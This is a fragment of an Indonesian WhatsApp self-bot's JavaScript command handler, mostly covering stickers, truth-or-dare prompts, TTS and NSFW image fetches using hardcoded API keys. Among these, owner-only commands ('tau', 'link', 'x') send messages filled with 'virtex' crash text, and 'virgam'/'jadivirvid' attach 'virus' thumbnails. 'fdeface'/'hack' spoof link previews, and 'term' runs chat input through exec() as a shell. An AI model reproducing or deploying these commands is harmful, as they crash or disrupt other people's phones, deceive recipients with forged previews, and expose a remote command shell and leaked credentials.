if ((isMedia && !qul.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo : qul
owgi = await  udin.downloadAndSaveMediaMessage(ger)
anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
tekks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${tekks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
reply('Gunakan foto/stiker!')
}
break
//truth & dare
case 'truth':
const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
const truteh = fs.readFileSync(`./media/dare.jpg`)
udin.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: qul })
break
case 'dare':
const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
const tod = fs.readFileSync(`./media/dare.jpg`)
udin.sendMessage(from, tod, image, { quoted: qul, caption: '*Dare*\n\n'+ der })
break
//jadi bot
case 'jadibot':
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
    //if(qul.key.fromMe) return reply('Tidak bisa jadibot di dalam bot')
    jadibot(reply,udin,from)
    break
    case 'stopjadibot':
    //if(qul.key.fromMe)return reply('tidak bisa stopjadibot kecuali owner')
    stopjadibot(reply)
    break
    case 'listbot':
    let teks = "*[ LIST BOT ]*"
          for(let i of listjadibot) {
          teks += `*Nomor* : ${i.jid.split('@')[0]}*Nama* : ${i.name}\n*Device* : ${i.phone.device_manufacturer}\n*Model* : ${i.phone.device_model}\n\n`
          }
          reply(teks)
    break
    case 'autorespon':
      if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
       if (args.length < 1) return reply(`Penggunaan ${prefix}autorespon on/off`)
           if (q === 'on'){
              autorespon = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (q === 'off'){
                    autorespon = true
                    reply(`Berhasil menonaktifkan autorespon`)
                } else {
                    reply(mess.error.api)
                }
                break
case 'info':
			        inf1 = `© *Bot Name* : XZN BOT\n`
			        inf1 += `© *Owner Name* : XZN\n`
			        inf1 += `© *AUTHOR* : XZNSENPAI\n`
			        inf1 += `© *Bot Number* : 6282255794209\n`
			        inf1 += `© *Owner Number* : 6282256080304\n`
			        reply(inf1)
			        break
case 'donasi':
const donasi = fs.readFileSync(`./media/donasi.jpg`)
const donasii = `
Mau donasi ya om?✨

“jauhilah api neraka, walau hanya dengan bersedekah sebiji kurma (sedikit). Jika kamu tidak punya, maka bisa dengan kalimah thayyibah”
 [HR. Bukhari 6539, Muslim 1016]

Dana = 6282256080304
pulsa TEL = 6282256080304
pulsa IM3 = 6285751414996

foto di atas hanya pemanis
*BUAT BELI JAJAN*`
udin.sendMessage(from, donasi, image, {quoted: qul, caption: donasii})
break
/*===========xznsenpai==========*/
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':
case 'attp':
if (args.length == 0) return xznsenpai.reply(from, `Contoh: ${prefix + command} xzn`)
ini_mn1k = args.join(" ")
ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/${command}?apikey=4dee02a2b2b8ffd4adf5e6ee&text=${encodeURI(ini_mn1k)}`)
udin.sendMessage(from, ini_buffer, sticker, { quoted: qul})
break
case 'art':
                case 'bts':
                case 'exo':
                case 'elf':
                case 'loli':
                case 'neko':
                case 'waifu':
                case 'shota':
                case 'husbu':
                case 'sagiri':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/${command}?apikey=4dee02a2b2b8ffd4adf5e6ee`)
                    udin.sendMessage(from, buffer, image, { quoted: qul})
                    break
                case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                    bupper = await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=4dee02a2b2b8ffd4adf5e6ee`)
                    udin.sendMessage(from, bupper, image, { quoted: qul})
                    break
                case 'ero':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'eroyuri':
                case 'cum_jpg':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/random2/${command}?apikey=4dee02a2b2b8ffd4adf5e6ee`)
                    udin.sendMessage(from, ini_buffer, image, { quoted: qul})
                    break
                    /**************/
				case 'lamgu':
                Testbang = udin.prepareMessageFromContent(from, {
				"listMessage":{
                  "title": "• Lamgu MENU •",
                  "description": "\nPilh Lamgu yg diinginkan",
                  "buttonText": "LIST - Lamgu",
                  "listType": "SINGLE_SELECT",
                  "sections": [ { "rows": [ { "title": "ah", "rowId": 0 }, { "title": "iri", "rowId": 0 }
                        ]
                     }]}}, {}) 
            udin.relayWAMessage(Testbang, {waitForAck: true})
            break
                case 'tau':
                if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				res = await udin.prepareMessageFromContent(from, {
				"groupInviteMessage": {
                "groupJid": "6282256080304-1625992335@g.us",
                "inviteCode": "znRX+d0y/ibaRXDY",
                "inviteExpiration": "1626251535",
                "groupName": `${virtau()}`,
                "caption": `${virtex()}`,
             },
                "contextInfo": {
               "forwardingScore": 3,
               "isForwarded": true
                }
                }, {contextInfo:{}}) 
                udin.relayWAMessage(res)
             
				res = await udin.prepareMessageFromContent(from, {
				"groupInviteMessage": {
                "groupJid": "6282256080304-1625992335@g.us",
                "inviteCode": "znRX+d0y/ibaRXDY",
                "inviteExpiration": "1626251535",
                "groupName": `${virtexapi()}`,
                "caption": `${virtau()}`,
             },
                "contextInfo": {
               "forwardingScore": 3,
               "isForwarded": true
                }
                }, {contextInfo:{}}) 
                udin.relayWAMessage(res)
                
               udin.sendMessage(from, `XZNSENPAI`, MessageType.text, {quoted: dinn })
           break
           case 'link':
           if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul) 
           res = await udin.prepareMessageFromContent(from,{
          "extendedTextMessage": {
            "text": "𐎑⃢BY;🇮🇩𝐱𝐳𝐧𝐬𝐞𝐧𝐩𝐚𝐢🇮🇩☙;\n\n╔═══----❖•ೋ° °ೋ•❖-----═══╗\n  ➲\"𝔫𝔞𝔪𝔞 𝔷𝔞𝔦𝔫𝔲𝔡𝔦𝔫 𝔞𝔫𝔤𝔤𝔞𝔯𝔞 𝔱??𝔫𝔦𝔰𝔥𝔞\" ➲\n╚═══----❖•ೋ° °ೋ•❖-----═══╝\n*╭━━ꩉ𖧹ᜓ᭢❍⃝⃘۪۪۪͡ ཻ̣֯ᬉཷ𖣘࿆ཪֺֹ໋ཱི࣯᳝ׄ፞͛ꪶཷ୭⸼۬࣪*\n*┊╭┄┈ꪶ࿐┄┈┄┈┄┈┄┈┄┈*\n*┊┆*                *PROSES*           \n*┊┆     ▭▬▬▭▬▬▭▬▬▭*\n*┊┆*        *MOHON DITUNGGU*\n*┊╰┈┄┈┄┈┄┈┄┈┄┈┈┄┈ ཿ⸼۬࣪ꪶ⸼༅*\n*╰━━ꩉ𖧹ᜓ᭢❍⃝⃘۪۪۪͡ ཻ̣֯ᬉཷ𖣘࿆ཪֺֹ໋ཱི࣯᳝ׄ፞͛ꪶཷ୭͓*\n\n*╭─「 Note* 」```\n│\n│• Sakit Hati Adalah Motifasi untuk\n│   mendapatkan di masa depan\n│\n╰────────────────\nhttps://xznsenpai.herokuapp.com",
            "matchedText": "https://xznsenpai.herokuapp.com",
            "description": `${virtexapi()}`,
            "title": `${virtexapi()}`,
            "previewType": "NONE"
            },
            "contextInfo": {
           "forwardingScore": 3,
             "isForwarded": true
            }
            }, {contextInfo:{}}) 
            udin.relayWAMessage(res)
            break
            case 'test':
                replyy('aktif bang')
				break
			/*case 'public':
			if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				public = true
				//xznsenpai.sendFakeStatus(from, `Status: PUBLIC`, fake)
				await xznsenpai.FakeTokoForwarded(from, `Status: PUBLIC`, fake)
				break*/
			case 'exif':
				if (!isMybot) return
				if (args.length < 1) return xznsenpai.reply(from, `Penggunaan ${prefix}exif nama|author`, qul)
				if (!arg.split('|')) return xznsenpai.reply(from, `Penggunaan ${prefix}exif nama|author`, qul)
				exif.create(arg.split('|')[0], arg.split('|')[1])
				xznsenpai.reply(from, 'sukses', qul)
				break
			case 'sticker':
			case 'stiker':
			case 's':
				if (isMedia && !qul.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : qul
					const media = await udin.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								xznsenpai.reply(from, mess.error.api, qul)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return xznsenpai.reply(from, mess.error.api, qul)
									xznsenpai.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), qul)
									fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
				} else if ((isMedia && qul.message.videoMessage.fileLength < 10000000 || isQuotedVideo && qul.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : qul
					const media = await udin.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					xznsenpai.reply(from, mess.wait, qul)
						await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								xznsenpai.reply(from, mess.error.api, qul)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return xznsenpai.reply(from, mess.error.api, qul)
									xznsenpai.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), qul)
									fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
				} else {
					xznsenpai.reply(from, `Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`, qul)
				}
				break
			case 'swm':
			case 'stickerwm':
				if (isMedia && !qul.message.videoMessage || isQuotedImage) {
					if (!arg.includes('|')) return xznsenpai.reply(from, `Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`, qul)
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : qul
					const media = await udin.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					const packname1 = arg.split('|')[0]
					const author1 = arg.split('|')[1]
					exif.create(packname1, author1, `stickwm_${sender}`)
					await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								xznsenpai.reply(from, mess.error.api, qul)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return xznsenpai.reply(from, mess.error.api, qul)
									xznsenpai.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), qul)
									fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
									fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
				} else if ((isMedia && qul.message.videoMessage.fileLength < 10000000 || isQuotedVideo && qul.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
					if (!arg.includes('|')) return xznsenpai.reply(from, `Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`, qul)
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : qul
					const media = await udin.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					const packname1 = arg.split('|')[0]
					const author1 = arg.split('|')[1]
					exif.create(packname1, author1, `stickwm_${sender}`)
					xznsenpai.reply(from, mess.wait, qul)
						await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								xznsenpai.reply(from, mess.error.api, qul)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return xznsenpai.reply(from, mess.error.api, qul)
									xznsenpai.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), qul)									
									fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
									fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
				} else {
					xznsenpai.reply(from, `Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`, id)
				}
				break
			case 'take':
				if (!isQuotedSticker) return xznsenpai.reply(from, `Reply sticker dengan caption *${prefix}takestick nama|author*`, qul)
				const pembawm = body.slice(6)
				if (!pembawm.includes('|')) return xznsenpai.reply(from, `Reply sticker dengan caption *${prefix}takestick nama|author*`, qul)
				const encmedia = JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				const media = await udin.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
				const packname = pembawm.split('|')[0]
				const author = pembawm.split('|')[1]
				exif.create(packname, author, `takestick_${sender}`)
				exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
					if (error) return xznsenpai.reply(from, mess.error.api, qul)
					xznsenpai.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), qul)
					fs.unlinkSync(media)
					fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
				})
				break
	  		 case 'ephemeral'://DhyZx:v
				if (!q) return xznsenpai.reply(from, 'textnya apa brohh', qul)
				udin.sendMessage(from, `${q}`,
					MessageType.text, {
					sendEphemeral: true,
					thumbnail: fs.readFileSync('./media/xznsenpai.jpeg')
					})
				break
				case 'x':
				//if (!q) return xznsenpai.reply(from, 'textnya apa brohh', qul)
				udin.sendMessage(from, `${virtau()}`,
					MessageType.text, {quoted: dinn,
					sendEphemeral: true,
					thumbnail: fs.readFileSync('./media/xznsenpai.jpeg')
					})
				break
			case 'colong':
			case 'ambil':
			if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				if (!isQuotedSticker) return xznsenpai.reply(from, `Reply sticker dengan caption *${prefix}colong*`, qul)
				const encmediia = JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				const meidia = await udin.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
				exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
					if (error) return xznsenpai.reply(from, mess.error.api, qul)
					xznsenpai.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), fvideo)
					fs.unlinkSync(meidia)
				})
				break
			//tts
			case 'tts':                
if (args.length < 1) return reply('Kode bahasa nya mana kak?')			
const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return udin.sendMessage(from, 'Textnya mana om', text, {quoted: qul})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 600
					? reply('Textnya kebanyakan om')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buffer = fs.readFileSync(rano)
							if (err) return reply('Gagal om:(')
							udin.sendMessage(from, buffer, audio, {quoted: qul, ptt:true})
							fs.unlinkSync(rano)
						})
					})
break
			case 'hidetag':
			if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
		    //if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}hidetag teks`, qul)
		    tekss = args.join(' ')
				xznsenpai.hideTag(from, `${tekss}`)
				break
			case 'runtime':
				run = process.uptime()
				let text = xznsenpai.runtime(run)
				//xznsenpai.sendFakeStatus(from, text, `Runtime bro`)
				await xznsenpai.FakeTokoForwarded(from, text, `Runtime bro`)
				break
			case 'speed':
			case 'cek':
let timestamp = speed();
let latensi = speed() - timestamp
run = process.uptime()
let ruun = xznsenpai.runtime(run)
replyy(`*PING BOT*\n\nSpeed: ${latensi.toFixed(4)}second\n\n*BOT AKTIF SELAMA*:\n\n${ruun}\n\n*Auto respon* : ${autorespon ? 'Off' : 'On'}`)
break
			case 'mystat': case 'mystatus':
				let i = []
				let giid = []
				for (mem of totalchat){
					i.push(mem.jid)
				}
				for (id of i){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
                let timestampi = speed();
				let latensii = speed() - timestampi
                const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = udin.user.phone
                anu = process.uptime()
                teskny = `
1*V. Whatsapp :* ${wa_version}
2*Baterai :* ${baterai.baterai}%
3*Charge :* ${baterai.cas === 'true' ? 'Ya' : 'Tidak'}
4*RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / 5${Math.round(require('os').totalmem / 1024 / 1024)}MB
5*MCC :* ${mcc}
6*MNC :* ${mnc}
7*Versi OS :* ${os_version}
8*Merk HP :* ${device_manufacturer}
9*Versi HP :* ${device_model}
10*Group Chat :* ${giid.length}
11*Personal Chat :* ${totalchat.length - giid.length}
12*Total Chat :* ${totalchat.length}
13*Speed :* ${latensii.toFixed(4)} Second
14*Runtime :* ${xznsenpai.runtime(anu)}
`
				njir = await udin.prepareMessageFromContent(from, {
					"orderMessage": {
						"orderId": "792749621388119",
						"sellerJid": "6282256080304@s.whatsapp.net",
						"thumbnail": fs.readFileSync('./media/xznsenpai.jpeg'),
						"itemCount": 99,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${teskny}`,
						"orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋𝘼??",
						 "token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg=="
						 },
                "contextInfo": {
               "forwardingScore": 3,
               "isForwarded": true
                }
                }, {quoted:flokasi, contextInfo:{}}) 
                udin.relayWAMessage(njir)
				break
			case 'kontak':
				argz = arg.split('|')
				if (!argz) return xznsenpai.reply(from, `Penggunaan ${prefix}kontak @tag atau nomor|nama`, qul)
				if (qul.message.extendedTextMessage != undefined){
                    mentioned = qul.message.extendedTextMessage.contextInfo.mentionedJid
					xznsenpai.sendKontak(from, mentioned[0].split('@')[0], argz[1])
				} else {
					xznsenpai.sendKontak(from, argz[0], argz[1])
				}
				break
			case 'term':
				if (!isMybot) return
				if (!arg) return
				exec(arg, (err, stdout) => {
					if (err) return xznsenpai.sendFakeStatus(from, err, fake)
					if (stdout) xznsenpai.sendFakeStatus(from, stdout, fake)
				})
				break
			case 'setreply':
			if (!isMybot) return
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}setreply teks`, qul)
				fake = arg
				xznsenpai.sendFakeStatus(from, `Sukses`, fake)
				break
			case 'setprefix':
			case 'sp':
			if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				if (!args) return xznsenpai.reply(from, `Penggunaan ${prefix}setprefix prefix`, qul)
				prefix = args
				reply(`Prefix berhasil diubah menjadi ${prefix}`)
				//xznsenpai.sendFakeStatus(from, `Prefix berhasil diubah menjadi ${prefix}`, fake)
				//await xznsenpai.FakeTokoForwarded(from, `Prefix berhasil diubah menjadi ${prefix}`, fake)
				break
			case 'setname':
				if (!isMybot) return
				if (!arg) return xznsenpai.reply(from, 'masukkan nama', qul)
				xznsenpai.setName(arg)
				.then((res) => xznsenpai.sendFakeStatus(from, JSON.stringify(res), fake))
				.catch((err) => xznsenpai.sendFakeStatus(from, JSON.stringify(err), fake))
				break
			case 'setbio':
				if (!isMybot) return
				if (!arg) return xznsenpai.reply(from, 'masukkan bio', qul)
				xznsenpai.setBio(arg)
				.then((res) => xznsenpai.sendFakeStatus(from, JSON.stringify(res), fake))
				.catch((err) => xznsenpai.sendFakeStatus(from, JSON.stringify(err), fake))
				break
			case 'fdeface': case 'hack':
				if (!arg) return xznsenpai.reply(from, `Penggunaaan ${prefix}fdeface url|title|desc|url\n\nContoh : ${prefix}fdeface https://google.com|Self Bot|By xznsenpaizz|https://xznsenpai.com`, qul)
				argz = arg.split("|")
				if (!argz) return xznsenpai.reply(from, `Penggunaaan ${prefix}fdeface url|title|desc|url\n\nContoh : ${prefix}fdeface https://google.com|Self Bot|By xznsenpaizz|https://xznsenpai.com`, qul)
				if ((isMedia && !qul.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo : qul
					let media = await udin.downloadMediaMessage(encmedia)
					xznsenpai.sendFakeThumb(from, argz[0], argz[1], argz[2], argz[3], media)
				} else {
					xznsenpai.sendFakeThumb(from, argz[0], argz[1], argz[2], argz[3])
				}
				break
			case 'fakethumbnail': case 'fthumbnail': case 'fakethumb':
				if ((isMedia && !qul.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo : qul
					let media = await udin.downloadMediaMessage(encmedia)
					xznsenpai.sendFakeImg(from, media, arg, fakeimage, qul)
				} else {
					xznsenpai.reply(from, `Kirim gambar atau reply dengan caption ${prefix}fakethumb caption`, qul)
				}
				break
				case 'virgam':
				case 'jadivirgam':
				if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				replyy(mess.wait)
				if ((isMedia && !qul.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo : qul
					let media = await udin.downloadMediaMessage(encmedia)
					xznsenpai.sendFakeImg(from, media, arg, virgam, qul)
				} else {
					xznsenpai.reply(from, `Kirim gambar atau reply dengan caption ${prefix}virgam`, qul)
				}
				break
				case 'jadivirvid':
				if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				if ((isMedia && qul.message.videoMessage.fileLength < 10000000 || isQuotedVideo && qul.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
				const kuning = isQuotedVideo ? JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : qul
				const tahi = await udin.downloadAndSaveMediaMessage(kuning)
				const tahii = fs.readFileSync(tahi)
				udin.sendMessage(from, tahii, MessageType.video, {quoted: qul, thumbnail: fs.readFileSync("./virus/virgam.jpg") })}
				break
				case 'jadivirgam2': 
				if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				if (!isQuotedSticker) return xznsenpai.reply(from, 'Reply stiker nya', qul)
				if (qul.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
					const encmedia = JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					const media = await udin.downloadAndSaveMediaMessage(encmedia)
					const uploadn = await uptonaufal(media, Date.now() + '.webp')
					const anjj = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${uploadn.result.image}`)
					await xznsenpai.sendMediaURL(from, anjj.data.result, 'Nih')
					fs.unlinkSync(media)
				} else {
					const encmedia = JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					const media = await udin.downloadAndSaveMediaMessage(encmedia)
					ran = xznsenpai.getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) {
							xznsenpai.reply(from, `gagal`, qul)
							fs.unlinkSync(ran)
						} else {
							buffer = fs.readFileSync(ran)
							xznsenpai.sendFakeImg(from, buffer, 'nih virgamnya', virgam, qul)
							fs.unlinkSync(ran)
						}
					})
				}
				break
			case 'setthumb':
			if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				boij = JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await udin.downloadMediaMessage(boij)
